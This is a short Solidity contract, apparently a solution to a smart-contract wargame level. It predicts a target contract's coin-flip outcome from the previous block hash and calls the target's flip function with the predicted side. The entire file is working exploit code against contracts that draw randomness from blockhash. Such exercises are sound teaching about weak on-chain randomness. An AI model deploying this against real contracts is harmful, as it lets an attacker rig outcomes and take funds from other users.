// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract HackCoinFlip {
    using SafeMath for uint256;

    address public targetContrac;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetContract) public {
        targetContrac = _targetContract;
    }

    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = targetContrac.call(payload);
        require(success, " Hacking Failed");
    }
}
